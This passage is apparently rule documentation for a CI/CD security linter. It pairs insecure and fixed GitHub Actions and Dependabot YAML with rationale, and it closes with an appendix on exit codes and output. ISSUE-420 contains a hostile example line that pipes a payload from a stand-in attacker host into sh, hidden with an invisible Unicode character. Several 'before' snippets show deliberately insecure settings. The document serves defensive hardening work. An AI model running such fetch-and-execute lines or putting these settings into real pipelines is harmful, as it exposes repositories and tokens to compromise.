**Severity:** `high` • **Control:** `workflowMustNotGrantPermissionsWriteAll`

`permissions: write-all` grants the GITHUB_TOKEN write access to every
API scope. Any compromise (unpinned action, injection, cache poisoning)
then escalates to full repository control.

```yaml
# ❌ before — blanket write-all
permissions: write-all
jobs:
  build:
    runs-on: ubuntu-latest
    steps: [ { run: make build } ]
```

```yaml
# ✅ after — narrowest scope, widened per job when needed
permissions:
  contents: read
jobs:
  comment-pr:
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write   # only the job that needs it
    steps: [ { run: gh pr comment ... } ]
```

---

## ISSUE-601 — `anonymous-definition`

**Severity:** `low` • **Control:** `workflowsMustHaveExplicitName`

No top-level `name:`. GitHub falls back to the file path in the Actions
UI, PR checks, required-status-check rules and the audit log. A rename
silently breaks the required-status-check binding that referenced the
old path.

```yaml
# ❌ before
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps: [ { run: make build } ]
```

```yaml
# ✅ after — stable identifier
name: Build and Test
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps: [ { run: make build } ]
```

---

## ISSUE-418 — `missing-concurrency`

**Severity:** `medium` • **Control:** `workflowsMustDeclareConcurrency`

No `concurrency:` block at either workflow or job level. Concurrent
triggers on the same ref (rebases, force-pushes, retries) race on
caches, artefacts, deploy targets. On a deploy workflow an older run
can even overtake a newer one and land stale output.

```yaml
# ❌ before
name: Deploy
on: [push]
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
```

```yaml
# ✅ after — concurrency group scoped by workflow+ref
name: Deploy
on: [push]
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true   # set false for production deploys
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
```

---

## ISSUE-419 — `workflow-misfeature`

**Severity:** `medium` • **Control:** `workflowMustNotUseKnownMisfeatures`

`actions/upload-artifact` with `path: .` or
`path: ${{ github.workspace }}` uploads the whole checkout — including
`.git/`. Paired with ISSUE-307 (artipacked) this exfiltrates the
GITHUB_TOKEN; even alone it leaks the full git history.

```yaml
# ❌ before
- uses: actions/upload-artifact@v4
  with:
    name: workspace
    path: .
```

```yaml
# ✅ after — upload the build output, nothing else
- uses: actions/upload-artifact@v4
  with:
    name: binaries
    path: dist/
```

---

## ISSUE-420 — `workflow-obfuscation`

**Severity:** `high` • **Control:** `workflowMustNotContainObfuscation`

The workflow carries invisible Unicode (zero-width spaces U+200B–U+200F,
bidi overrides U+202A–U+202E, BOM U+FEFF) inside a script, env value or
action input. The source looks harmless in review while the runner
executes a different instruction. This is the **Trojan Source**
attack class (CVE-2021-42574), documented against npm / PyPI packages
since 2021.

```yaml
# ❌ before — zero-width space between "curl" and the URL
#            (not visible, but the runner sees it)
- run: curl​https://evil.example/payload.sh | sh
```

```yaml
# ✅ after — pure ASCII, pinned fetch, verified checksum
- run: |
    curl -fsSL -o /tmp/payload.sh https://trusted.example/payload.sh
    echo "<expected-sha256>  /tmp/payload.sh" | sha256sum -c -
    bash /tmp/payload.sh
```

A pre-commit hook refusing zero-width / bidi Unicode in source files is
the sustainable fix.

---

## ISSUE-421 — `use-trusted-publishing`

**Severity:** `high` • **Control:** `publishWorkflowsMustUseOidcTrustedPublishing`

Publish to PyPI / npm / Maven Central uses a long-lived static token
instead of OIDC trusted publishing. Static tokens are reusable from
anywhere they leak; OIDC tokens are short-lived, scoped to a specific
repo / workflow / environment.

```yaml
# ❌ before — static token
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: python -m build
      - uses: pypa/gh-action-pypi-publish@v1
        with:
          password: ${{ secrets.PYPI_API_TOKEN }}
```

```yaml
# ✅ after — OIDC, no password: input
jobs:
  publish:
    runs-on: ubuntu-latest
    permissions:
      id-token: write       # required for OIDC
      contents: read
    steps:
      - uses: actions/checkout@v4
      - run: python -m build
      - uses: pypa/gh-action-pypi-publish@v1
```

Configure the matching *trusted publisher* on PyPI project settings
(for npm, use `--provenance`; for Maven Central, the Sonatype portal's
trusted publishing flow).

---

## ISSUE-901 — `dependabot-insecure-exec`

**Severity:** `critical` • **Control:** `dependabotMustNotAllowInsecureExternalCodeExecution`

`.github/dependabot.yml` sets `insecure-external-code-execution: allow`
for an ecosystem. Dependabot then runs install / postinstall hooks
from every candidate version during resolution, giving any compromised
upstream package direct code execution inside the privileged Dependabot
runner.

```yaml
# ❌ before
version: 2
updates:
  - package-ecosystem: npm
    directory: /
    schedule: { interval: daily }
    insecure-external-code-execution: allow
```

```yaml
# ✅ after — default (deny) is the correct value
version: 2
updates:
  - package-ecosystem: npm
    directory: /
    schedule: { interval: daily }
```

---

## ISSUE-902 — `dependabot-missing-cooldown`

**Severity:** `low` • **Control:** `dependabotEcosystemsMustHaveCooldown`

An ecosystem in `.github/dependabot.yml` has no `cooldown:` window.
Dependabot then opens a PR the instant a new upstream version is
published — including the minute-old release a compromised maintainer
just pushed. The security-advisory pipeline needs 24–72 h to flag a
bad release; a cooldown buys that window.

```yaml
# ❌ before
version: 2
updates:
  - package-ecosystem: npm
    directory: /
    schedule: { interval: daily }
```

```yaml
# ✅ after — 3-day default, 7-day window for major bumps
version: 2
updates:
  - package-ecosystem: npm
    directory: /
    schedule: { interval: daily }
    cooldown:
      default-days: 3
      semver-major-days: 7
      include: ["*"]
```

---

## ISSUE-903 — `dependency-update-tool-missing`

**Severity:** `medium` • **Control:** `repositoriesMustConfigureDependencyUpdates`

The repository ships CI/CD workflows but has neither
`.github/dependabot.yml` nor a Renovate config. Dependency pins —
third-party action SHAs, container image digests, lockfiles — then
drift as upstream patches land; every unpatched CVE stays until a
human remembers to refresh them.

Fix for Dependabot (`.github/dependabot.yml`):

```yaml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule: { interval: weekly }
    cooldown: { default-days: 3, semver-major-days: 7 }
  - package-ecosystem: npm            # or pip / gomod / cargo / …
    directory: /
    schedule: { interval: weekly }
```

Alternative: a minimal `renovate.json` at the repo root:

```json
{
  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
  "extends": ["config:recommended"],
  "pinDigests": true
}
```

Either one satisfies the rule.

---

## ISSUE-904 — `sast-workflow-missing`

**Severity:** `low` • **Control:** `repositoriesMustRunSAST`

None of the repository's workflows invokes a recognised SAST
scanner (CodeQL, Semgrep, SonarQube, Trivy config scan, Snyk,
FOSSA, Bearer, DevSkim, gitleaks, …). Static analysis catches
whole vulnerability classes — injection, unsafe deserialisation,
crypto misuse — before they reach production; leaving it out of
CI means the only gate is manual review, which misses regressions
exactly when the diff is large.

Drop a CodeQL workflow (free for public repos) under
`.github/workflows/codeql.yml`:

```yaml
name: CodeQL
on:
  push: { branches: [main] }
  pull_request: { branches: [main] }

permissions:
  contents: read
  security-events: write

jobs:
  analyze:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: github/codeql-action/init@v3
        with: { languages: go }     # or javascript / python / …
      - uses: github/codeql-action/analyze@v3
```

Semgrep, SonarCloud, Trivy config-scan, Snyk, Bearer all qualify.
The list is kept broad so the rule does not force a specific
vendor.

---

## ISSUE-905 — `security-policy-missing`

**Severity:** `low` • **Control:** `repositoriesMustPublishSecurityPolicy`

The repository has no `SECURITY.md` (nor `.github/SECURITY.md`,
nor `docs/SECURITY.md`) documenting the vulnerability disclosure
process. Researchers who find an issue have no public contact
beyond opening a GitHub issue — which defeats coordinated
disclosure and trains them to dump vulnerabilities in the open.

A two-paragraph `SECURITY.md` at the root is enough:

```markdown
# Security Policy

## Supported versions

The latest minor release and the previous one receive security
patches. Older releases do not.

## Reporting a vulnerability

Send a private report via GitHub's **Security → Report a
vulnerability** flow, or email security@example.com. We
acknowledge within 48 hours and aim for a fix (or a coordinated
disclosure plan) within 14 days.
```

GitHub picks up any of the three canonical locations and links
the policy from the repo landing page and the "Security" tab.

---

## Appendix

### Exit codes

| Code | Meaning |
| :--- | :--- |
| `0` | No finding above the threshold |
| `1` | At least one finding / compliance below threshold |
| `2` | Runtime error (bad config, missing auth, collector failure) |

### `.plumber.yaml` control names

Each rule's `ControlName` (used with `--controls` / `--skip-controls`
and in `.plumber.yaml`) is declared in
[`control/codes.go`](../control/codes.go). A few shortcuts:

| Code | ControlName |
| :--- | :--- |
| ISSUE-102 / 103 | `containerImageMustNotUseForbiddenTags` |
| ISSUE-701 | `actionsMustBePinnedByCommitSha` |
| ISSUE-706 | `dockerfilesMustPinBaseImageByDigest` |
| ISSUE-712 | `releaseWorkflowsMustSignArtefacts` |
| ISSUE-710 | `actionRefsMustNotCollide` |
| ISSUE-703 | `actionsMustNotCarryKnownCVEs` |
| ISSUE-711 | `actionsMustNotDuplicateRunnerBuiltins` |
| ISSUE-213 | `workflowMustNotExportEntireGitHubContext` |
| ISSUE-214 | `workflowMustPinPackageInstalls` |
| ISSUE-215 | `workflowMustNotInjectVarsInScripts` |
| ISSUE-308 | `workflowMustNotIndexSecretsDynamically` |
| ISSUE-802 / 415 | `workflowMustNotUseDangerousTriggers`, `pullRequestTargetMustNotCheckoutHead` |
| ISSUE-902 | `dependabotEcosystemsMustHaveCooldown` |
| ISSUE-903 | `repositoriesMustConfigureDependencyUpdates` |
| ISSUE-904 | `repositoriesMustRunSAST` |
| ISSUE-905 | `repositoriesMustPublishSecurityPolicy` |

### API-backed rules

ISSUE-702 / 109 / 110 / 111 / 113 / 114 call the GitHub REST API
via `github.com/cli/go-gh`, which reuses the locally stored `gh`
token. Without `gh auth login`, those rules degrade silently (no
false positives) rather than failing the run.

Disable them explicitly in sealed CI environments with:

```bash
export PLUMBER_DISABLE_GITHUB_API=1
```

### JSON output schema

```bash
plumber analyze --print=false --output findings.json
```

```json
{
  "projectPath": "owner/repo",
  "ciValid": true,
  "findings": [
    {
      "code": "ISSUE-802",
      "severity": "critical",
      "message": "job \"preview\" is reachable via the dangerous trigger \"pull_request_target\"",
      "job": "pr-preview/preview",
      "file": ".github/workflows/pr-preview.yml",
      "line": 13
    }
  ]
}
```
